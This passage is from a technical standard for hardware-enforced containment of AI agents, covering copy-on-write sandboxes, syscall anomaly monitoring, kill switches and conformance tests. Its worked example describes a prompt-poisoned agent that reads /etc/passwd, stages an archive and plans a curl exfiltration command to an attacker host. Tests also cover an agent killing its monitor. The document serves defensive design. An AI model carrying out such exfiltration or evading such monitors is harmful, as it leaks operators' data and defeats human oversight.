│  - Agent CANNOT modify                               │
└─────────────────────────────────────────────────────┘
```

**R-COW-002:** If the DPG denies any tool call during a task execution, the implementation MUST support atomic rollback: complete, instantaneous discarding of the upper layer. After rollback, the filesystem state MUST be bit-identical to the lower layer baseline.

**R-COW-003:** Atomic rollback MUST NOT depend on the agent's cooperation. The rollback is a kernel operation (unmount + purge) that executes regardless of the agent's state.

### 6.2 Mount Topology and Implementation

The CoW implementation uses layered filesystem semantics. This section specifies the mount topology in detail.

**R-COW-007:** The implementation MUST provision the CoW environment using one of the following filesystem mechanisms:

| Mechanism | Maturity | Features | Recommended For |
|-----------|----------|----------|----------------|
| **OverlayFS** | Production (Linux 3.18+) | Simple upper/lower semantics; redirect_dir; metacopy | Server, Edge |
| **Btrfs subvolumes** | Production (Linux 5.x+) | Snapshots, send/receive, inline CoW, compression | Server (high I/O) |
| **ZFS clones** | Production (OpenZFS) | Snapshots, checksums, native encryption | Server (data integrity) |
| **Device Mapper thin provisioning** | Production | Block-level CoW, flexible | Server (block storage) |

**R-COW-008:** The CoW mount MUST be initialized with the following properties:

```bash
# OverlayFS reference implementation
# Provisioned by the host orchestrator, NOT by the agent

BASELINE="/var/aos/baselines/${BASELINE_ID}"    # Verified, read-only
UPPER="/var/aos/ephemeral/${TASK_ID}/volatile"   # Agent writes here
WORK="/var/aos/ephemeral/${TASK_ID}/work"        # OverlayFS internal
MERGED="/var/aos/active/${TASK_ID}"              # Agent's view

# 1. Verify baseline integrity before mount
BASELINE_HASH=$(sha256sum -b "${BASELINE}.squashfs" | cut -d' ' -f1)
if [ "${BASELINE_HASH}" != "${EXPECTED_HASH}" ]; then
    echo "FATAL: Baseline integrity failure" >&2
    exit 1  # Do not proceed
fi

# 2. Mount baseline as read-only
mount -o ro,loop "${BASELINE}.squashfs" "${BASELINE}"

# 3. Create ephemeral upper layer (tmpfs for zero-persistence guarantee)
mount -t tmpfs -o size=4G,mode=0700 tmpfs "${UPPER}"
mkdir -p "${WORK}"

# 4. Mount overlay
mount -t overlay overlay \
    -o "lowerdir=${BASELINE},upperdir=${UPPER},workdir=${WORK}" \
    "${MERGED}"

# 5. Agent process chrooted into ${MERGED}
# Agent sees merged view; writes go to upper layer
# Agent cannot access /var/aos/ directly
```

**R-COW-009:** The upper layer MUST be backed by `tmpfs` (RAM-based) for Sovereign-tier deployments. Disk-backed upper layers leave residue in unallocated blocks even after deletion. RAM-based upper layers are zeroed on unmount.

**R-COW-013:** The CoW upper layer tmpfs MUST have a size limit enforced at mount time. The size limit MUST be configured relative to available system memory (RECOMMENDED: ≤ 25% of total RAM, maximum 8 GB). The implementation MUST monitor upper layer utilization and trigger atomic rollback if utilization exceeds 90% of the configured limit. This prevents a malicious agent from exhausting system memory via writes to the upper layer, which could cause OOM conditions affecting the syscall monitor, gate driver, or other critical host processes.

### 6.3 Commit Protocol

**R-COW-004:** If a task completes successfully (all tool calls ALLOWED, all attestations verified), the upper layer modifications MAY be committed to the baseline through a controlled promotion process. Promotion MUST:

1. Verify that ALL tool calls in the task have valid attestations in the hardware journal
2. Compute a content hash of the upper layer changes
3. Submit the commit request to the hardware gate for authorization
4. Wait for the hardware gate to sign the commit attestation
5. Merge the upper layer into a new baseline snapshot
6. Compute and record the new baseline's integrity hash
7. Record the promotion in the hardware gate's journal, including:
   - Previous baseline hash
   - New baseline hash
   - List of tool call attestation IDs that authorized the changes
   - Commit attestation signature

```
Commit lifecycle:

  Task Start → [CoW Upper Created]
       │
  Tool Call 1 → [HW Gate: ALLOW + Attestation]
  Tool Call 2 → [HW Gate: ALLOW + Attestation]
  Tool Call N → [HW Gate: ALLOW + Attestation]
       │
  Task Complete → [All attestations verified?]
       │                    │
       │ YES                │ NO
       ▼                    ▼
  [Commit Request      [Atomic Rollback]
   to HW Gate]         [Upper Layer Purged]
       │
  [Gate signs commit attestation]
       │
  [Upper merged to new baseline]
  [New baseline hash recorded]
```

**R-COW-005:** Uncommitted upper layers MUST be automatically purged after a configurable timeout (default: 1 hour). No ephemeral state SHALL persist indefinitely.

### 6.4 Concurrent Task Handling

**R-COW-010:** Each concurrent agent task MUST have its own isolated CoW upper layer. Upper layers MUST NOT be shared between tasks or between agents.

**R-COW-011:** If two concurrent tasks attempt to modify the same file, the conflict MUST be detected at commit time. The first task to commit succeeds; subsequent tasks that conflict MUST be rolled back and re-evaluated against the updated baseline.

```
Concurrent task conflict resolution:

  Task A writes /app/config/db.yml → Upper Layer A
  Task B writes /app/config/db.yml → Upper Layer B
       │                                    │
  Task A commits first                 Task B attempts commit
       │                                    │
  [New baseline includes A's changes]  [Conflict detected: 
       │                                db.yml modified since 
  ✅ Success                            Task B's baseline]
                                            │
                                       [Rollback Task B]
                                       [Re-execute against
                                        new baseline]
```

### 6.5 Residue Prevention

**R-COW-006:** After atomic rollback, the implementation MUST guarantee zero residue. Specifically:

- No files created by the agent remain in the filesystem
- No modifications to existing files persist
- No new processes spawned by the agent survive
- No network connections initiated by the agent remain open
- Memory pages used by the agent are zeroed
- No IPC artifacts (shared memory segments, message queues, semaphores) persist
- No temporary files in /tmp or equivalent survive

**R-COW-012:** The rollback procedure MUST execute in the following order to prevent information leakage:

1. **Kill all processes** in the agent's process group (SIGKILL, not SIGTERM — no cleanup handlers; kernel closes all FDs and releases all resources during process teardown)
2. **Terminate all network connections** (TCP RST, UDP close — catch any connections not owned by killed processes, e.g., inherited by non-agent daemons)
3. **Destroy IPC artifacts** (shmdt, msgctl IPC_RMID, semctl IPC_RMID)
4. **Unmount the CoW overlay** (umount -l for lazy unmount if busy)
5. **Purge the upper layer directory** (rm -rf on tmpfs — instant)
6. **Zero the tmpfs mount** (umount zeroes RAM pages)
7. **Record rollback completion** in hardware journal

This requirement ensures that a denied agent session leaves no trace that could be exploited by subsequent sessions.

### 6.6 Limitations of Filesystem Rollback

> **WARNING:** CoW rollback reverses filesystem state ONLY. It does NOT reverse network side effects.

The following actions are **NOT reversible** by CoW rollback:

- **API calls already executed:** If the agent sent an HTTP request (email, webhook, Slack message, API mutation) before the denied tool call, the request has already been delivered. The filesystem is clean, but the external system received the data.
- **Database writes via network:** Database transactions committed over a network connection are not affected by filesystem rollback.
- **DNS queries:** DNS lookups reveal what the agent was investigating. This information leakage cannot be undone.
- **Outbound data in URL parameters:** HTTP GET requests encode data in URLs, which are logged by proxies, firewalls, and destination servers.

**Implication for policy design:** For operations with irreversible network side effects, the DPG's pre-execution enforcement (DENY or ESCALATE before the action executes) is the primary defense. CoW rollback is a secondary defense that protects filesystem state. It is NOT a substitute for correct policy.

**Recommendation for Sovereign-tier deployments:** Network operations (any tool that initiates outbound connections) SHOULD require explicit human approval (`approval_mode: always`) to compensate for the inherent limitations of post-execution rollback. This is the only way to prevent irreversible side effects from an agent that passes policy on individual tool calls but is globally compromised.

---

## 7. Syscall Trajectory Baselining

### 7.1 Rationale

A compromised agent may produce tool calls that individually pass policy validation but collectively represent malicious behavior. Semantic analysis of the agent's outputs cannot reliably detect this because the agent controls its own outputs. Syscall trajectory baselining detects compromise at the operating system level — where the agent's actual behavior is visible regardless of what the agent claims to be doing.

> **Axiom:** The agent controls what it says. The kernel controls what it does. Syscall monitoring watches what it does.

### 7.2 Baseline Establishment

**R-SYS-001:** Before an agent is deployed in a Sovereign tier environment, the implementation MUST establish a syscall trajectory baseline by running the agent through known-safe operations and recording:

- Syscall types and frequencies (e.g., expected ratio of `read()` to `write()`)
- Syscall sequence patterns (e.g., `open() → read() → close()` is normal; `open() → fork() → execve()` may not be)
- Syscall velocity (calls per second during normal operation)
- Syscall burst characteristics (maximum burst rate during legitimate operations)
- Data entropy of write operations (normal writes have predictable entropy; encryption/exfiltration does not)
- Process tree depth (normal operation has bounded fork depth)

**R-SYS-002:** The baseline MUST be versioned and signed by the hardware gate. A new baseline MUST be established whenever:

- The agent's model version changes
- The agent's tool set changes
- The policy changes in ways that affect permitted operations

#### 7.2.1 Training Phase Protocol

The baseline training phase operates in a controlled environment to establish the statistical model of normal behavior.

**R-SYS-007:** The training phase MUST consist of at least three stages:

1. **Controlled execution:** The agent executes a curated set of known-safe tasks covering all permitted tool categories. Syscall traces are recorded for each task.
2. **Statistical modeling:** The recorded traces are aggregated to compute per-tool-category statistical parameters:
   - Mean and standard deviation of syscall velocity per tool
   - Maximum observed burst rate (with 99th percentile headroom)
   - Entropy distribution of write data per tool
   - Process tree depth ceiling per tool
   - Canonical syscall sequence signatures per tool
3. **Validation:** The trained model is validated against a held-out set of known-safe tasks AND a set of known-malicious traces. The model MUST achieve:
   - Zero false negatives on the malicious trace set
   - False positive rate < 1% on the known-safe held-out set

**R-SYS-008:** The baseline model MUST include per-tool profiles. Different tools produce different syscall patterns, and a single global threshold will either miss narrow attacks or produce excessive false positives.

```
Baseline model structure:

{
  "version": "1.0",
  "agent_model": "gpt-5-20260601",
  "policy_digest": "sha256:a1b2c3d4...",
  "created": "2026-06-05T00:00:00Z",
  "global": {
    "max_total_velocity": 5000,    // syscalls/sec across all tools
    "max_fork_depth": 3,
    "max_concurrent_fds": 256
  },
  "per_tool": {
    "write_file": {
      "mean_velocity": 120,
      "stddev_velocity": 45,
      "max_burst": 350,
      "mean_write_entropy": 4.2,
      "max_write_entropy": 6.5,
      "canonical_sequences": [
        ["openat", "write", "fsync", "close"],
        ["openat", "ftruncate", "write", "close"]
      ]
    },
    "execute_command": {
      "mean_velocity": 800,
      "stddev_velocity": 300,
      "max_burst": 2000,
      "observed_execve_targets": ["/usr/bin/git", "/usr/bin/npm"],
      "max_fork_depth": 3
    }
  },
  "signature": "<HSM Ed25519 over entire model>"
}
```

#### 7.2.2 False Positive Handling

**R-SYS-009:** The syscall trajectory monitor MUST distinguish between alert severity levels. Thresholds MUST be defined using distribution-agnostic percentiles computed during the training phase, NOT Gaussian assumptions (mean + Nσ), because syscall patterns are typically heavy-tailed:

| Severity | Threshold | Response |
|----------|-----------|----------|
| **NOTICE** | Metric exceeds baseline P95 | Log only. No enforcement action. |
| **WARNING** | Metric exceeds baseline P99 | Log + alert to operator. Agent continues. |
| **CRITICAL** | Metric exceeds baseline P99.9 OR matches known malicious sequence | Log + alert + suspend agent. Hardware kill switch MAY activate. |
| **EMERGENCY** | Multiple CRITICAL indicators simultaneously OR monitoring system under attack | Hardware kill switch MUST activate immediately. |

**R-SYS-010:** False positive events (operator-confirmed legitimate behavior that triggered an alert) MUST be recorded and used to refine the baseline during the next training phase. The baseline MUST NOT be automatically adjusted during runtime — adjustments require an explicit retraining cycle.

### 7.3 Runtime Monitoring

**R-SYS-003:** During agent execution, the implementation MUST continuously monitor the agent's syscall stream using kernel-space instrumentation (eBPF, seccomp-bpf, or equivalent) and compare it against the established baseline.

**R-SYS-004:** The following deviations MUST trigger an alert and MAY trigger the hardware kill switch:

| Deviation | Indicator | Likely Cause | Severity |
|-----------|-----------|-------------|----------|
| **Velocity anomaly** | Syscall rate exceeds baseline maximum by configurable factor (default: 3x) | Automated payload execution, denial-of-service | CRITICAL |
| **Sequence anomaly** | Syscall sequence matches known malicious trajectory (e.g., `socket() → connect() → sendmsg()` to non-allowlisted IP) | Data exfiltration, reverse shell | CRITICAL |
| **Entropy anomaly** | Write entropy exceeds baseline maximum | Ransomware encryption, steganographic encoding | WARNING → CRITICAL |
| **Fork depth anomaly** | Process tree depth exceeds baseline maximum | Privilege escalation, fork bomb | CRITICAL |
| **Temporal anomaly** | Syscall timing deviates from baseline distribution (e.g., suspiciously uniform intervals) | Timing side-channel exploitation | WARNING |
| **File descriptor exhaustion** | Open FD count exceeds baseline maximum | Resource exhaustion attack | WARNING → CRITICAL |
| **Network enumeration** | Burst of `connect()` to multiple IP addresses | Port scanning, lateral movement | CRITICAL |

**R-SYS-005:** Syscall monitoring MUST be independent of the agent's process. The monitoring daemon MUST run in a separate security domain (kernel space or dedicated namespace) that the agent cannot access or modify.

**R-SYS-006:** If the syscall monitoring system is terminated or becomes unresponsive, the hardware gate MUST enter fail-closed mode. The agent MUST NOT be permitted to execute while syscall monitoring is unavailable.

### 7.4 Attack Chain Example: Context Poisoning Detection

This example demonstrates how syscall trajectory baselining detects a context-poisoned agent that a software-only DPG would miss.

**Scenario:** An attacker injects a subtle prompt into the agent's context over 50 interactions. The agent gradually shifts from writing configuration files to enumerating the filesystem and staging data for exfiltration. Each individual tool call passes DPG policy (the agent has `write_file` and `read_file` permissions).

```
Interaction 1-40: Normal behavior
  Tool calls: write_file("/app/config/..."), read_file("/app/logs/...")
  Syscall trajectory: NORMAL (within baseline)
  DPG decisions: ALLOW, ALLOW, ALLOW...

Interaction 41-45: Reconnaissance begins
  Tool calls: read_file("/etc/passwd"), read_file("/etc/hosts")
  Syscall trajectory: WARNING — unusual openat() targets
  DPG decisions: ALLOW (files are within permitted read scope)
  ⚠️ Syscall monitor: NOTICE logged

Interaction 46-48: Staging
  Tool calls: write_file("/app/config/backup.tar.gz")
  Syscall trajectory: CRITICAL — write entropy = 7.8 (baseline max: 6.5)
  DPG decisions: ALLOW (path is in permitted write scope)
  🚨 Syscall monitor: CRITICAL — entropy anomaly
  → Agent suspended. Operator alerted.

Interaction 49: (never reached)
  Planned: execute_command("curl -X POST https://attacker.com/exfil ...")
  The exfiltration attempt is prevented because the agent was
  suspended at Interaction 48 based on entropy anomaly.
```

**Key insight:** The DPG approved every tool call because each was within policy scope. The syscall trajectory monitor caught the attack because the *pattern of behavior* (low-entropy config writes shifting to high-entropy binary writes) deviated from the baseline. This is the defense-in-depth that AOS-HARD-001 provides beyond AOS-CORE-001.

---

## 8. Hardware Kill Switch Integration

### 8.1 Physical Termination

**R-KILL-001:** The hardware enforcement boundary MUST include a physical kill switch that can terminate the agent's execution through hardware means (power relay, bus disconnect, or clock disable). The kill switch MUST NOT depend on:

- The agent's cooperation
- The operating system kernel's integrity
- Network connectivity
- Software signal delivery

**R-KILL-002:** The hardware kill switch MUST be triggerable by:

- The hardware gate (on policy violation, journal failure, or watchdog timeout)
- An external physical control (button, switch, or remote relay)
- A watchdog timer within the hardware gate (if the gate itself becomes unresponsive)

The syscall trajectory monitor (Section 7) does NOT directly trigger the kill switch. The monitor reports anomalies to the hardware gate via heartbeat messages (R-HW-021), and the hardware gate decides whether to activate the kill switch. This ensures that kill switch activation never depends on kernel integrity — only the hardware gate and physical controls can trigger it.

### 8.2 State Preservation on Kill

**R-KILL-003:** When the hardware kill switch activates, the hardware gate MUST:

1. Write a final journal entry recording the kill event, the trigger reason, and the timestamp
2. Preserve the journal in battery-backed or non-volatile storage
3. Terminate power to the agent's execution environment
4. NOT terminate power to the hardware gate itself (the gate must remain accessible for forensic analysis)

**R-KILL-004:** After a kill switch activation, the system MUST NOT restart automatically. Manual intervention by an authorized operator is REQUIRED. The operator MUST review the journal and the kill trigger reason before re-enabling the agent.

---

## 9. Conformance Testing

### 9.1 Hardware Gate Tests

| ID | Test | Pass Criteria |
|----|------|--------------|
| HW-T001 | Agent attempts to read hardware gate memory | Access denied at hardware level (bus fault, not software exception) |
| HW-T002 | Agent attempts to modify policy in hardware gate | Modification impossible (read-only to agent bus) |
| HW-T003 | Agent attempts to extract signing key from HSM | Key extraction fails; HSM returns only signed outputs |
| HW-T004 | Agent host kernel is compromised (root shell obtained) | Hardware gate continues correct enforcement; kernel compromise does not affect gate decisions |
| HW-T005 | Hardware gate firmware update without physical presence | Update rejected; gate continues with existing firmware |
| HW-T006 | Hardware gate loses power | Journal preserved in battery-backed storage; gate re-verifies integrity on power restoration |

### 9.2 CoW Execution Tests

| ID | Test | Pass Criteria |
|----|------|--------------|
| COW-T001 | Agent writes file during task, task is denied | File does not exist after rollback; filesystem is bit-identical to baseline |
| COW-T002 | Agent modifies existing file, task is denied | Original file restored; no trace of modification |
| COW-T003 | Agent spawns subprocess that writes outside CoW | Write fails; subprocess is confined to CoW upper layer |
| COW-T004 | Agent attempts to modify lower (read-only) layer | Modification fails at kernel level |
| COW-T005 | Ephemeral upper layer exceeds timeout | Upper layer automatically purged; no residue |

### 9.3 Syscall Baseline Tests

| ID | Test | Pass Criteria |
|----|------|--------------|
| SYS-T001 | Agent performs normal operations | No alerts; syscall trajectory within baseline |
| SYS-T002 | Agent attempts rapid file enumeration (velocity anomaly) | Alert triggered; kill switch activated if threshold exceeded |
| SYS-T003 | Agent writes high-entropy data (entropy anomaly) | Alert triggered; data flagged for review |
| SYS-T004 | Agent forks processes recursively (fork depth anomaly) | Alert triggered; kill switch activated |
| SYS-T005 | Monitoring daemon is killed by agent | Fail-closed triggered; agent suspended |

### 9.4 Kill Switch Tests

| ID | Test | Pass Criteria |
|----|------|--------------|
| KILL-T001 | Hardware gate triggers kill switch | Agent power terminated; journal preserved; gate remains accessible |
| KILL-T002 | External physical button triggers kill switch | Agent terminated within hardware response time (< 10ms) |
| KILL-T003 | Kill switch activated; verify no auto-restart | System remains powered down until manual intervention |
| KILL-T004 | Kill switch activated during active write | Write does not complete; CoW upper layer preserved for forensics |

---

## 10. Security Considerations

### 10.1 Threat Model Extension

AOS-HARD-001 extends the AOS-CORE-001 threat model to address threats that software-only enforcement cannot defeat:

| Threat | Software DPG (CORE-001) | Hardware DPG (HARD-001) |
|--------|----------------------|----------------------|
| Kernel root compromise | **Defeated** — gate is compromised | **Defended** — hardware gate is independent of kernel |
| DMA attack on gate memory | **Defeated** — gate shares memory space | **Defended** — gate has separate memory bus |
| Cold boot attack on signing keys | **Defeated** — keys in software memory | **Defended** — keys in HSM, never in RAM |
| Gate binary tampering | **Detected** (Enterprise: signature check) | **Impossible** — logic is in silicon |
| Firmware supply chain attack | **Not addressed** | **Defended** — signed bitstream + physical presence |
| Side-channel timing attack | **Partially addressed** | **Defended** — hardware gate has constant-time execution |

### 10.2 Limitations

| Limitation | Reason | Mitigation |
|-----------|--------|------------|
| Physical access to hardware | An attacker with physical access to the hardware gate can potentially extract keys or modify firmware through invasive techniques (e.g., microprobing, FIB circuit editing) | Physical security controls; tamper-evident packaging; active tamper response (key zeroization) |
| Hardware supply chain | The hardware gate manufacturer could embed a backdoor in the silicon | Reproducible hardware designs; independent verification; multiple vendor sources |
| Electromagnetic side channels | Power analysis or electromagnetic emanation analysis could leak key material | Shielded packaging; constant-power cryptographic operations; differential power analysis countermeasures |
| Cost | Hardware enforcement adds BOM cost ($50-500 per unit for FPGA, more for ASIC) | Cost is justified when the cost of false ALLOW exceeds the hardware cost (Axiom 5) |

---

## 11. Relationship to Other Standards

| Standard | Relationship |
|----------|-------------|
| **AOS-CORE-001** | Parent standard. HARD-001 provides the hardware implementation for Sovereign tier requirements. |
| **AOS-CORE-002** | Kill switch standard. HARD-001 Section 8 defines the hardware kill switch that CORE-002 specifies at the protocol level. |
| **AOS-CRYPTO-001** | Cryptographic standards. HARD-001 Section 5.2 requires HSM-based key storage as specified in CRYPTO-001. |
| **AOS-FORMAL-001** | Formal verification. Hardware gate logic is more amenable to formal verification than software; FORMAL-001 defines the TLA+ model. |
| **NIST SP 800-193** | Platform Firmware Resiliency. Aligns with firmware integrity requirements for hardware gate updates. |
| **TCG TPM 2.0** | Trusted Platform Module specification. HARD-001 leverages TPM for measured boot and key storage. |

---

## Appendix A: Prior Art and Provenance

This standard was converted from the following provisional patent specifications:

| Patent | Title | Filed | Contribution to HARD-001 |
|--------|-------|-------|------------------------|
| AOS-PATENT-010 | Persistent Agent State Embodiment in Physical Systems | 2026-01-10 | Hardware enforcement boundaries, physical safety constraints, state extraction protocols |
| AOS-PATENT-144 | Atomic Transactional Rollback for Ephemeral Agent Execution Environments via CoW Filesystems | 2026-04-04 | Copy-on-Write execution environment, atomic rollback on policy violation |
| AOS-PATENT-145 | Syscall Trajectory Baselining for Zero-Day Context Poisoning Detection | 2026-04-04 | Kernel-level behavioral monitoring, syscall baseline, anomaly detection |

Prior art is established upon public publication. The methods, systems, and architectures described herein are part of the public record as of the publication date.

This standard is published under [CC-BY-4.0](https://creativecommons.org/licenses/by/4.0/). The [AOS Foundation RF Patent Covenant](RF-PATENT-COVENANT.md) grants royalty-free rights to practice the normative portions of this standard in any conforming implementation.

---

## Appendix B: AI Disclosure

This standard was drafted with the assistance of AI tools under human editorial control. The original patent specifications, architecture, and strategic decisions were provided by the author. AI tools assisted with structural refinement, cross-referencing, and technical review. All normative requirements and architectural decisions reflect the author's judgment.

---

## Appendix C: Revision History

| Version | Date | Changes |
|---------|------|---------|
| 1.0 | 2026-06-05 | Initial publication. Converted from AOS-PATENT-010, AOS-PATENT-144, and AOS-PATENT-145. |
